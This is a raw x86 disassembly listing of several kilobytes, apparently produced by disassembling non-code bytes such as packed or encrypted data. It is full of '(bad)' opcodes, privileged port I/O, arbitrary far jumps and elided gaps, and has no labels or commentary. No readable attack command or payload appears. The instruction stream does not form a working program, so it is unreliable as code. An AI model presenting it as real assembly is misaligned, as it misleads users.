  429fa3:	push   ebp
  429fa4:	cli    
  429fa5:	fst    QWORD PTR [edi-0x33a336e2]
  429fab:	repz add BYTE PTR ss:[eax-0x66fd497a],bl
  429fb3:	enter  0xe74,0xa7
  429fb7:	pop    esi
  429fb8:	js     0x42a02c
  429fba:	pop    ebx
  429fbb:	sbb    eax,DWORD PTR [ecx+0x37911801]
  429fc1:	push   es
  429fc2:	and    ah,BYTE PTR [eax]
  429fc4:	cmp    eax,0x46117b21
  429fc9:	inc    esi
  429fca:	xor    DWORD PTR [ebp-0x26dc06c2],0xffffffb9
  429fd1:	inc    ebp
  429fd2:	int3   
  429fd3:	mov    ch,0xa7
  429fd5:	mov    ebp,0x76fcbb3
  429fda:	arpl   WORD PTR [edx-0x7b1cefd],ax
  429fe0:	sbb    dh,al
  429fe2:	loopne 0x42a003
  429fe4:	sub    al,0x76
  429fe6:	sbb    al,0x9c
  429fe8:	in     eax,dx
  429fe9:	jbe    0x429fe3
  429feb:	dec    edi
  429fec:	adc    eax,ebx
  429fee:	es xchg ebx,eax
  429ff0:	ret    
  429ff1:	gs add eax,0xfd39c4eb
  429ff7:	lods   eax,DWORD PTR ds:[esi]
  429ff8:	outs   dx,BYTE PTR ds:[esi]
  429ff9:	pop    esi
  429ffa:	jle    0x429f82
  429ffc:	or     BYTE PTR [esi+ecx*2],0x70
  42a000:	mov    BYTE PTR [ebp-0xb510799],dh
  42a006:	lahf   
  42a007:	mov    ecx,esi
  42a009:	dec    esi
  42a00a:	mov    edi,0x2592ae33
  42a00f:	and    eax,0x2150611b
  42a014:	dec    ecx
  42a015:	xchg   esp,eax
  42a016:	rcl    DWORD PTR [ebp-0x35],0x81
  42a01a:	rcr    dl,0x96
  42a01d:	ja     0x429feb
  42a01f:	icebp  
  42a020:	inc    ebx
  42a021:	(bad)  
  42a022:	cli    
  42a023:	mov    bl,0xc6
  42a025:	pop    esp
  42a026:	sub    DWORD PTR [edx-0x54],ebp
  42a029:	mov    ch,BYTE PTR [eax+0x6dcf7b36]
  42a02f:	iret   
  42a030:	pop    ebp
  42a031:	lock in al,dx
  42a033:	jbe    0x429fdf
  42a035:	out    0x1d,al
  42a037:	mov    eax,ds:0xb6b49d8a
  42a03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a03d:	push   ebx
  42a03e:	lock pop ds
  42a040:	cdq    
  42a041:	(bad)  
  42a042:	imul   ecx,DWORD PTR [edx-0x533d14a0],0x729517d7
  42a04c:	adc    dh,ah
  42a04e:	pop    ds
  42a04f:	cld    
  42a050:	gs push es
  42a052:	pop    ss
  42a053:	js     0x42a06b
  42a055:	pop    ebx
  42a056:	sar    DWORD PTR [eax+edx*1],cl
  42a059:	in     eax,dx
  42a05a:	lods   eax,DWORD PTR ds:[esi]
  42a05b:	aad    0x0
  42a05d:	pcmpgtw mm7,mm6
  42a060:	repz cmp eax,0x14e85473
  42a066:	jl     0x429ff9
  42a068:	outs   dx,BYTE PTR ds:[esi]
  42a069:	jae    0x42a078
  42a06b:	nop
  42a06c:	sub    al,0x88
  42a06e:	push   edx
  42a06f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42a071:	in     eax,dx
  42a072:	mov    al,0x65
  42a074:	cli    
  42a075:	leave  
  42a076:	iret   
  42a077:	fcom   QWORD PTR [esi]
  42a079:	push   cs
  42a07a:	ins    BYTE PTR es:[edi],dx
  42a07b:	test   al,0xd3
  42a07d:	scas   eax,DWORD PTR es:[edi]
  42a07e:	and    al,0xbe
  42a080:	int3   
  42a081:	fidiv  WORD PTR [eax+edi*1+0x34]
  42a085:	repz dec edx
  42a087:	test   eax,0x18cbbef4
  42a08c:	test   DWORD PTR [edx+0xc00b],edi
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	mov    cl,0x95
  42a102:	or     BYTE PTR [eax],ah
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	jb     0x42a180
  42a10e:	shl    BYTE PTR [edx-0x3f],1
  42a111:	arpl   dx,dx
  42a113:	test   eax,0x72dca749
  42a118:	xor    ebx,DWORD PTR [edx-0xe]
  42a11b:	pop    esi
  42a11c:	arpl   WORD PTR [edi+ebx*8],sp
  42a11f:	(bad)  
  42a120:	in     al,dx
  42a121:	rcl    BYTE PTR ds:0x296f5a8c,cl
  42a127:	imul   edx,DWORD PTR cs:[esi-0x25],0xffffffbd
  42a12c:	mov    eax,0x2763f32e
  42a131:	test   ecx,edx
  42a133:	cmp    BYTE PTR [edi-0x32],bh
  42a136:	mov    bh,0xb2
  42a138:	nop
  42a139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13a:	leave  
  42a13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13c:	push   0x35
  42a13e:	push   ds
  42a13f:	fild   DWORD PTR [eax]
  42a141:	add    BYTE PTR [edi],dl
  42a143:	push   esi
  42a144:	inc    eax
  42a145:	test   eax,0xf0789918
  42a14a:	pop    esp
  42a14b:	call   0xf9080163
  42a150:	cmp    edx,DWORD PTR [eax+0x45]
  42a153:	cmp    DWORD PTR [ebp+ebp*4-0xe],ecx
  42a157:	lahf   
  42a158:	pop    ebp
  42a159:	lea    edx,[eax-0x4c]
  42a15c:	mov    esi,0xd89d2912
  42a161:	dec    esp
  42a162:	stos   BYTE PTR es:[edi],al
  42a163:	adc    eax,0x6cf0d983
  42a168:	sbb    eax,0xf8636bd1
  42a16d:	jbe    0x42a16f
  42a16f:	sbb    DWORD PTR [edi+0x3416a51a],esp
  42a175:	inc    ebx
  42a176:	shr    DWORD PTR [edi-0x75],cl
  42a179:	dec    edx
  42a17a:	push   ecx
  42a17b:	pop    esi
  42a17c:	scas   al,BYTE PTR es:[edi]
  42a17d:	mov    BYTE PTR [edi-0x12],cl
  42a180:	push   esp
  42a181:	xchg   bh,dh
  42a183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a184:	lahf   
  42a185:	test   edi,ecx
  42a187:	cs pop ebp
  42a189:	adc    DWORD PTR ds:[esi],0x2a873da4
  42a190:	stos   DWORD PTR es:[edi],eax
  42a191:	cmp    DWORD PTR [edi+0x7f],ebx
  42a194:	les    eax,FWORD PTR [edi]
  42a196:	pop    ebp
  42a197:	mov    eax,ds:0x2b83aa56
  42a19c:	sub    edi,0xc978f71b
  42a1a2:	push   esp
  42a1a3:	jg     0x42a21a
  42a1a5:	ss and al,0x36
  42a1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1a9:	mov    dh,0xd9
  42a1ab:	push   0xbec8d1bb
  42a1b0:	sbb    ebp,DWORD PTR [bx+di+0x2a]
  42a1b4:	out    dx,al
  42a1b5:	(bad)  
  42a1b6:	out    dx,al
  42a1b7:	sbb    al,0xc7
  42a1b9:	sbb    eax,0x81bf58a5
  42a1be:	jno    0x42a154
  42a1c0:	dec    ebp
  42a1c1:	and    al,0xe3
  42a1c3:	cs mov ecx,0xb42fdbb4
  42a1c9:	mov    BYTE PTR [eax+0x3b35255f],dh
  42a1cf:	mov    ds:0x5b85db9d,eax
  42a1d4:	add    esi,DWORD PTR [ebx-0x14268b96]
  42a1da:	cdq    
  42a1db:	push   edi
  42a1dc:	imul   esp,DWORD PTR [ebp+0xdc700ca],0x14
  42a1e3:	je     0x42a1d0
  42a1e5:	mov    ebp,0x3cc92764
  42a1ea:	xchg   ecx,eax
  42a1eb:	test   DWORD PTR [esi-0x2e72844e],0x21ef5ba0
  42a1f5:	push   0x77
  42a1f7:	js     0x42a253
  42a1f9:	sbb    edi,ebx
  42a1fb:	pop    ecx
  42a1fc:	mov    al,0x40
  42a1fe:	dec    ebp
  42a1ff:	push   edi
  42a200:	mov    esi,0xcf7ed1c3
  42a205:	idiv   ebx
  42a207:	push   eax
  42a208:	mov    bh,0x67
  42a20a:	dec    ebp
  42a20b:	and    DWORD PTR [edx+0xee51ad],edx
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fld    st(2)
  42a281:	outs   dx,DWORD PTR ds:[esi]
  42a282:	sbb    eax,0x1c29004
  42a287:	add    BYTE PTR [ecx+eax*1],al
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	clc    
  42a28d:	sub    ebx,DWORD PTR [edi]
  42a28f:	ret    
  42a290:	push   ebx
  42a291:	push   ss
  42a292:	mov    dh,0xab
  42a294:	cwde   
  42a295:	add    eax,0x2e47ac75
  42a29a:	cld    
  42a29b:	or     DWORD PTR [ebx+0x336a2513],0x7
  42a2a2:	mov    al,ds:0xcbdd1098
  42a2a7:	imul   ecx,DWORD PTR ds:0x6ded52a6,0xffffffa5
  42a2ae:	cmp    DWORD PTR [ebp+0x2e],ebp
  42a2b1:	je     0x42a277
  42a2b3:	stos   DWORD PTR es:[edi],eax
  42a2b4:	loope  0x42a26b
  42a2b6:	jmp    0x42a2fe
  42a2b8:	jns    0x42a2b5
  42a2ba:	hlt    
  42a2bb:	jge    0x42a242
  42a2bd:	jmp    0x20f7e40e
  42a2c2:	add    al,0x91
  42a2c4:	and    edi,DWORD PTR [edi]
  42a2c6:	popa   
  42a2c7:	imul   eax,DWORD PTR [eax-0x1b],0x777ff3aa
  42a2ce:	lods   eax,DWORD PTR ds:[esi]
  42a2cf:	ficom  DWORD PTR [edx+0x60]
  42a2d2:	mov    ch,0x4f
  42a2d4:	dec    esi
  42a2d5:	jl     0x42a2f6
  42a2d7:	arpl   sp,di
  42a2d9:	add    ch,BYTE PTR [edi-0xe]
  42a2dc:	cmp    al,0x80
  42a2de:	dec    edi
  42a2df:	and    al,0x59
  42a2e1:	inc    eax
  42a2e2:	xor    DWORD PTR [ecx+0x33],0x1e
  42a2e6:	ds xchg edi,eax
  42a2e8:	imul   bh
  42a2ea:	sar    DWORD PTR [ebx+0x749edf89],1
  42a2f0:	arpl   WORD PTR [eax],di
  42a2f2:	dec    esi
  42a2f3:	xchg   esi,eax
  42a2f4:	pop    es
  42a2f5:	mov    ebp,eax
  42a2f7:	les    ebp,FWORD PTR [esi-0x1c]
  42a2fa:	xchg   ch,bh
  42a2fc:	add    BYTE PTR [eax+0x40],bl
  42a2ff:	test   al,0x7e
  42a301:	stos   BYTE PTR es:[edi],al
  42a302:	xchg   esi,esi
  42a304:	int3   
  42a305:	mov    dl,0x2c
  42a307:	xchg   edi,eax
  42a308:	pmulhuw mm6,QWORD PTR [ecx-0x71]
  42a30c:	pop    ebx
  42a30d:	xor    eax,0x623d4301
  42a312:	cs sbb al,0xa2
  42a315:	ret    0x69dc
  42a318:	scas   eax,DWORD PTR es:[edi]
  42a319:	mov    dh,0x1e
  42a31b:	das    
  42a31c:	xor    DWORD PTR [esi-0x79],ecx
  42a31f:	push   0x60af4961
  42a324:	div    BYTE PTR [edx-0x59]
  42a327:	rol    DWORD PTR [esi],0x53
  42a32a:	imul   esi,esp,0xffffffcc
  42a32d:	cmp    edx,DWORD PTR [edx+0x5ff4b7d0]
  42a333:	div    ah
  42a335:	mov    bl,0xcb
  42a337:	out    dx,al
  42a338:	dec    ecx
  42a339:	jecxz  0x42a3a4
  42a33b:	dec    ebp
  42a33c:	(bad)  
  42a33d:	or     edi,ebp
  42a33f:	mov    ecx,0xb232315b
  42a344:	pop    ebx
  42a345:	mov    ds:0x648ad61f,al
  42a34a:	lock retf 0x235d
  42a34e:	pusha  
  42a34f:	lahf   
  42a350:	imul   eax,DWORD PTR [esi+0x29081ec7],0xe15f83cb
  42a35a:	pop    ecx
  42a35b:	sbb    BYTE PTR [esi+0x79],al
  42a35e:	repz pop eax
  42a360:	dec    ebx
  42a361:	add    dl,BYTE PTR [edi-0x6fb598e]
  42a367:	sbb    al,0xc
  42a369:	push   0xffffffa6
  42a36b:	ror    bl,1
  42a36d:	cmp    eax,esi
  42a36f:	nop
  42a370:	sub    esp,DWORD PTR [ebx+eiz*2+0x32]
  42a374:	or     al,0xf2
  42a376:	pop    ebp
  42a377:	push   esp
  42a378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a379:	shr    DWORD PTR [esi+0x78],1
  42a37c:	faddp  st(3),st
  42a37e:	push   ds
  42a37f:	jbe    0x42a384
  42a381:	mov    ah,0x96
  42a383:	lock fidiv DWORD PTR [edi-0x2ce44f07]
  42a38a:	add    esi,ebp
  42a38c:	add    eax,0x73dda5
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xc3cdf43d
  42a403:	sete   bl
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	popa   
  42a40d:	(bad)  
  42a40e:	jmp    0x1e0bf0ce
  42a413:	cwde   
  42a414:	pop    DWORD PTR ds:0x4c861702
  42a41a:	xchg   BYTE PTR [edx],dl
  42a41c:	cmp    eax,0x8b2f44d2
  42a421:	adc    eax,0x566cc480
  42a426:	push   ebp
  42a427:	test   DWORD PTR [ebp+0x50eab8fb],ecx
  42a42d:	sbb    dh,bh
  42a42f:	mov    edi,0x5d22132d
  42a434:	aad    0x1
  42a436:	jo     0x42a488
  42a438:	push   edi
  42a439:	push   ds
  42a43a:	bnd ret 
  42a43c:	retf   0x743f
  42a43f:	in     eax,dx
  42a440:	cmp    eax,0xc2dadb28
  42a445:	sbb    ebx,DWORD PTR [bx+di]
  42a448:	add    dl,bh
  42a44a:	call   0xe7a4:0xc4e9b606
  42a451:	mov    dl,0x56
  42a453:	adc    al,0xf1
  42a455:	dec    edi
  42a456:	sbb    DWORD PTR [ebx+ebx*1],0xffffffe6
  42a45a:	push   ss
  42a45b:	push   ds
  42a45c:	out    0xa,eax
  42a45e:	push   eax
  42a45f:	push   0xbc516d4d
  42a464:	fisub  DWORD PTR [edx+0x2c01c318]
  42a46a:	call   0xff9996d9
  42a46f:	ret    0x521f
  42a472:	mov    eax,0x8d65d358
  42a477:	jnp    0x42a40f
  42a479:	in     al,0xd0
  42a47b:	sbb    esp,edi
  42a47d:	bound  edi,QWORD PTR [ebx+0x26d4756f]
  42a483:	push   ebx
  42a484:	lock popa 
  42a486:	sub    al,0x47
  42a488:	out    dx,al
  42a489:	jle    0x42a45e
  42a48b:	and    al,0x34
  42a48d:	fiadd  WORD PTR [ecx]
  42a48f:	pop    ecx
  42a490:	sub    dl,BYTE PTR [eax+0x1354f59b]
  42a496:	out    0xb7,al
  42a498:	xchg   DWORD PTR [esi],ecx
  42a49a:	outs   dx,BYTE PTR ds:[esi]
  42a49b:	mov    al,0x4b
  42a49d:	dec    ebp
  42a49e:	out    dx,eax
  42a49f:	sub    dl,BYTE PTR [edi+ebx*8+0x17]
  42a4a3:	(bad)  
  42a4a4:	sbb    BYTE PTR [ebx+0x55],bh
  42a4a7:	iret   
  42a4a8:	inc    esi
  42a4a9:	pop    edi
  42a4aa:	xor    edi,DWORD PTR [edi+0x10f49d6a]
  42a4b0:	inc    edi
  42a4b1:	and    ebx,ebx
  42a4b3:	xchg   edi,eax
  42a4b4:	push   0xfffffffb
  42a4b6:	cli    
  42a4b7:	xor    ebx,ebx
  42a4b9:	and    eax,ebx
  42a4bb:	xor    esi,DWORD PTR [edi-0x512b0589]
  42a4c1:	lods   al,BYTE PTR ds:[esi]
  42a4c2:	xor    ch,BYTE PTR [ecx+0x2eef14f8]
  42a4c8:	cmc    
  42a4c9:	ret    
  42a4ca:	sbb    al,0xbc
  42a4cc:	jmp    0xa9ef:0x5390a7af
  42a4d3:	mov    WORD PTR ds:[edi+0x14],ds
  42a4d7:	sub    DWORD PTR [edx+ecx*8-0x59a93e13],esi
  42a4de:	stos   BYTE PTR es:[edi],al
  42a4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4e0:	sbb    eax,0x8db7a2ff
  42a4e5:	aas    
  42a4e6:	jnp    0x42a469
  42a4e8:	add    esi,0x7790bcf1
  42a4ee:	and    eax,DWORD PTR [ecx-0x4]
  42a4f1:	push   edi
  42a4f2:	sahf   
  42a4f3:	je     0x42a52b
  42a4f5:	jg     0x42a4b7
  42a4f7:	xchg   esp,eax
  42a4f8:	jg     0x42a545
  42a4fa:	(bad)  [ebp+ecx*4-0x40]
  42a4fe:	push   eax
  42a4ff:	popf   
  42a500:	push   ebp
  42a501:	sti    
  42a502:	push   esp
  42a503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a504:	retf   0x3e7d
  42a507:	sahf   
  42a508:	add    esi,DWORD PTR [eax+0x61]
  42a50b:	or     eax,0x50111c48
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x28bcc29f
  42a583:	adc    DWORD PTR [eax+0x40001c4],ebx
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [edi+edi*2-0x3],al
  42a58f:	adc    al,0x29
  42a591:	lods   eax,DWORD PTR ds:[esi]
  42a592:	adc    eax,0xe7c0c417
  42a597:	adc    eax,0x364d9e5f
  42a59c:	dec    BYTE PTR [esi+edi*1-0x19]
  42a5a0:	xchg   bl,ah
  42a5a2:	cmp    eax,0x772fa275
  42a5a7:	fcom   QWORD PTR [ebp-0x6d]
  42a5aa:	out    dx,al
  42a5ab:	xlat   BYTE PTR ds:[ebx]
  42a5ac:	je     0x42a5bf
  42a5ae:	in     eax,dx
  42a5af:	jmp    0x42a619
  42a5b1:	pop    esp
  42a5b2:	(bad)  
  42a5b3:	aaa    
  42a5b4:	cdq    
  42a5b5:	loope  0x42a5dd
  42a5b7:	lods   eax,DWORD PTR ds:[esi]
  42a5b8:	stc    
  42a5b9:	inc    ebx
  42a5ba:	into   
  42a5bb:	xchg   edi,eax
  42a5bc:	cmp    al,0x6c
  42a5be:	stos   BYTE PTR es:[edi],al
  42a5bf:	bound  esi,QWORD PTR [edx]
  42a5c1:	ret    
  42a5c2:	fidiv  WORD PTR [esi-0x17]
  42a5c5:	aaa    
  42a5c6:	pushf  
  42a5c7:	rcr    BYTE PTR [ebx+0x60],0xd7
  42a5cb:	and    eax,0x423a61db
  42a5d0:	xor    bl,BYTE PTR [eax]
  42a5d2:	or     BYTE PTR [esi-0x280e708e],ah
  42a5d8:	add    bl,BYTE PTR [esi+0x63]
  42a5db:	dec    esi
  42a5dc:	ins    DWORD PTR es:[edi],dx
  42a5dd:	lea    eax,[eax-0x4b]
  42a5e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5e1:	or     eax,0xe7484a03
  42a5e6:	bound  edx,QWORD PTR [ebx-0x461cea65]
  42a5ec:	mov    DWORD PTR [esi+0x418d3b94],esi
  42a5f2:	mov    bh,0x6a
  42a5f4:	xor    eax,0xd4016fb2
  42a5f9:	lds    edx,FWORD PTR [ebx-0x607a405c]
  42a5ff:	stc    
  42a600:	dec    esi
  42a601:	add    DWORD PTR [edx],0xf44be4c0
  42a607:	fwait
  42a608:	jle    0x42a671
  42a60a:	retf   
  42a60b:	lds    esp,FWORD PTR [edi-0x4c042e71]
  42a611:	mov    cl,al
  42a613:	cmp    DWORD PTR [eax+0x3e769d85],edx
  42a619:	inc    ecx
  42a61a:	jno    0x42a5f7
  42a61c:	jbe    0x42a696
  42a61e:	jnp    0x42a5e8
  42a620:	pop    ebp
  42a621:	adc    DWORD PTR [edi+edx*1],esp
  42a624:	cmp    eax,0x5f454b65
  42a629:	clc    
  42a62a:	daa    
  42a62b:	mov    dh,0x13
  42a62d:	addr16 ss mov ebp,0x56156b53
  42a634:	mov    WORD PTR [eax-0x7214f906],es
  42a63a:	in     al,dx
  42a63b:	(bad)  
  42a63c:	popa   
  42a63d:	in     eax,0xc6
  42a63f:	aad    0xa7
  42a641:	cmp    esp,ecx
  42a643:	pop    edx
  42a644:	add    al,0xc5
  42a646:	jge    0x42a676
  42a648:	(bad)  
  42a649:	scas   al,BYTE PTR es:[edi]
  42a64a:	dec    edx
  42a64b:	(bad)  
  42a64c:	imul   DWORD PTR [esi]
  42a64e:	cmp    bh,BYTE PTR [ecx]
  42a650:	xor    DWORD PTR [ebx-0x64],eax
  42a653:	push   ecx
  42a654:	xor    edx,DWORD PTR [eax+edx*4]
  42a657:	or     eax,0xc6fd7980
  42a65c:	scas   eax,DWORD PTR es:[edi]
  42a65d:	mov    bh,0x79
  42a65f:	inc    esp
  42a660:	icebp  
  42a661:	mov    bh,0x74
  42a663:	mov    eax,?
  42a665:	mov    gs,WORD PTR [eax-0x35]
  42a668:	jnp    0x42a667
  42a66a:	and    eax,0x7bdfecb
  42a66f:	int    0x64
  42a671:	es out 0x88,al
  42a674:	nop
  42a675:	cmc    
  42a676:	repnz ins DWORD PTR es:[edi],dx
  42a678:	shr    BYTE PTR [ecx],1
  42a67a:	xor    esp,DWORD PTR [edi-0x32667432]
  42a680:	sbb    BYTE PTR [ecx],ah
  42a682:	dec    edi
  42a683:	inc    esp
  42a684:	dec    edx
  42a685:	fadd   st,st(4)
  42a687:	cwde   
  42a688:	fimul  WORD PTR [edx+edi*2+0x6]
  42a68c:	mov    ds:0xca7390,al
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1d47ece4],0x9ca95807
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	cmp    cl,bh
  42a70e:	daa    
  42a70f:	sub    bh,BYTE PTR [ebx]
  42a711:	cmp    edx,esi
  42a713:	inc    eax
  42a714:	popf   
  42a715:	push   edx
  42a716:	jno    0x42a6cd
  42a718:	xchg   ebx,eax
  42a719:	fisttp DWORD PTR [edi]
  42a71b:	daa    
  42a71c:	jecxz  0x42a6b9
  42a71e:	or     eax,0x19863a6e
  42a723:	int    0x29
  42a725:	and    bl,BYTE PTR [ebx+0x72]
  42a728:	jns    0x42a749
  42a72a:	or     al,0xaa
  42a72c:	ds sub eax,0xabbc0409
  42a732:	push   eax
  42a733:	or     eax,0x6eee86ec
  42a738:	aaa    
  42a739:	or     al,0xad
  42a73b:	or     al,0x58
  42a73d:	pop    ebp
  42a73e:	adc    edi,eax
  42a740:	js     0x42a7a3
  42a742:	jp     0x42a722
  42a744:	add    bl,BYTE PTR [esi+eax*8+0x46]
  42a748:	pop    edx
  42a749:	or     DWORD PTR [ebx],0x317aa269
  42a74f:	mov    dh,0xd7
  42a751:	add    ebx,DWORD PTR [esi+0x5e]
  42a754:	cmc    
  42a755:	mov    ds:0x427ed84c,eax
  42a75a:	shl    DWORD PTR [edx+0x1a],1
  42a75d:	mov    dh,0xeb
  42a75f:	out    dx,al
  42a760:	cld    
  42a761:	push   es
  42a762:	in     al,0x81
  42a764:	inc    esi
  42a765:	push   ebx
  42a766:	daa    
  42a767:	mov    dh,0xa8
  42a769:	xcrypt-ctr (bad)
  42a76a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a76b:	fwait
  42a76c:	js     0x42a7b6
  42a76e:	push   0xffffffc4
  42a770:	call   0xde69:0x3d316eff
  42a777:	jae    0x42a7dc
  42a779:	sbb    DWORD PTR [edi*1+0x44d051ce],edi
  42a780:	loopne 0x42a7a4
  42a782:	data16 rol dh,cl
  42a785:	adc    BYTE PTR ds:0x8ba609a1,0xd9
  42a78c:	popf   
  42a78d:	push   ebp
  42a78e:	aaa    
  42a78f:	inc    ebx
  42a790:	shl    BYTE PTR [edx-0x61cd63ad],0x4a
  42a797:	jo     0x42a732
  42a799:	(bad)  
  42a79a:	and    ah,BYTE PTR [edi+0x37bc412c]
  42a7a0:	(bad)  
  42a7a1:	ficom  WORD PTR [edx]
  42a7a3:	add    edx,DWORD PTR [esi-0x36]
  42a7a6:	loopne 0x42a776
  42a7a8:	imul   esp,ebx,0xfffffff4
  42a7ab:	sub    DWORD PTR [ebp+0x4d077f13],eax
  42a7b1:	fadd   QWORD PTR [ecx+0x41]
  42a7b4:	jbe    0x42a802
  42a7b6:	cwde   
  42a7b7:	imul   esi,DWORD PTR [edx],0xffffffb8
  42a7ba:	jmp    0xfa96:0xa9d8a201
  42a7c1:	pop    ds
  42a7c2:	sbb    BYTE PTR [eax+0x55f8ae6f],dh
  42a7c8:	shr    BYTE PTR [edi],0xe
  42a7cb:	mov    eax,ds:0xbe8db0b6
  42a7d0:	or     bl,BYTE PTR [eax+0x7723fc89]
  42a7d6:	and    al,0xa4
  42a7d8:	pop    esp
  42a7d9:	dec    ebx
  42a7da:	add    eax,0xd939fe0b
  42a7df:	jo     0x42a79f
  42a7e1:	jno    0x42a83d
  42a7e3:	mov    ah,0x74
  42a7e5:	adc    esi,0xffffffe7
  42a7e8:	lods   eax,DWORD PTR ds:[esi]
  42a7e9:	(bad)  
  42a7ea:	loopne 0x42a821
  42a7ec:	retf   
  42a7ed:	push   eax
  42a7ee:	hlt    
  42a7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7f0:	or     dl,dl
  42a7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7f3:	push   0x378f01d4
  42a7f8:	scas   eax,DWORD PTR es:[edi]
  42a7f9:	push   ss
  42a7fa:	lea    edi,[edx+0x73fff8b9]
  42a800:	neg    DWORD PTR [esi+edx*4-0x49b93c09]
  42a807:	ins    DWORD PTR es:[edi],dx
  42a808:	jae    0x42a82c
  42a80a:	or     BYTE PTR [eax],0x62
  42a80d:	pop    esi
  42a80e:	and    al,0xf1
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x4f396c97
  42a882:	pop    ebx
  42a883:	mul    BYTE PTR [eax+0x40001c6]
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebx-0x42db727a],al
  42a891:	add    ebx,ecx
  42a893:	loope  0x42a88d
  42a895:	loop   0x42a8e5
  42a897:	xchg   edi,eax
  42a898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a899:	retf   
  42a89a:	and    eax,0x5fc007f7
  42a89f:	sti    
  42a8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8a1:	mov    eax,ds:0x62f6fad3
  42a8a6:	les    ebx,FWORD PTR [ecx]
  42a8a8:	sub    DWORD PTR [esi],ebp
  42a8aa:	cwde   
  42a8ab:	push   es
  42a8ac:	pop    ebx
  42a8ad:	dec    ebp
  42a8ae:	(bad)  
  42a8af:	shl    BYTE PTR [ecx+ebp*1-0x6a10dc86],cl
  42a8b6:	cmp    al,0x68
  42a8b8:	mov    bh,0x4b
  42a8ba:	xor    al,0xa1
  42a8bc:	lea    eax,[ebx-0x6595bb60]
  42a8c2:	sub    DWORD PTR [edi-0x20],ebx
  42a8c5:	mov    gs,WORD PTR [eax]
  42a8c7:	retf   0xf74e
  42a8ca:	imul   ebx,DWORD PTR [eax+0xf],0x47
  42a8ce:	sbb    eax,0x67b1c566
  42a8d3:	enter  0x66af,0x98
  42a8d7:	aad    0x0
  42a8d9:	jne    0x42a88d
  42a8db:	(bad)  
  42a8dc:	fwait
  42a8dd:	in     al,dx
  42a8de:	(bad)  
  42a8df:	into   
  42a8e0:	cs push es
  42a8e2:	dec    edi
  42a8e3:	pop    edx
  42a8e4:	pushf  
  42a8e5:	xor    cl,BYTE PTR [ebp+0x20805aed]
  42a8eb:	mov    ds:0x3a771b2b,eax
  42a8f0:	into   
  42a8f1:	dec    esi
  42a8f2:	fwait
  42a8f3:	and    DWORD PTR [ebp-0x1a],eax
  42a8f6:	dec    eax
  42a8f7:	fsubrp st(3),st
  42a8f9:	mov    WORD PTR [eax-0x1447571b],cs
  42a8ff:	xbegin 0x8290651b
  42a905:	test   eax,0xa620851
  42a90a:	ds push 0x30
  42a90d:	outs   dx,BYTE PTR ds:[esi]
  42a90e:	popa   
  42a90f:	cld    
  42a910:	ret    
  42a911:	shl    BYTE PTR [eax+ebp*4-0x3bc389e6],0xf0
  42a919:	push   ebx
  42a91a:	inc    edx
  42a91b:	mov    dh,0x7f
  42a91d:	add    eax,DWORD PTR [ebp-0x538114c]
  42a923:	out    0xe8,al
  42a925:	add    BYTE PTR [eax],cl
  42a927:	pusha  
  42a928:	push   edi
  42a929:	cmp    eax,DWORD PTR [edi-0x4a]
  42a92c:	push   cs
  42a92d:	mov    eax,0x55031f81
  42a932:	push   esp
  42a933:	cli    
  42a934:	pusha  
  42a935:	pop    edx
  42a936:	mov    eax,0xc63b7e09
  42a93b:	add    ebx,DWORD PTR [edi+esi*8]
  42a93e:	jg     0x42a998
  42a940:	or     edx,ecx
  42a942:	push   ebp
  42a943:	sbb    BYTE PTR [ecx],0x76
  42a946:	sbb    ch,cl
  42a948:	data16 mov ah,0xe8
  42a94b:	test   al,0x7
  42a94d:	ds or  edx,0x1b
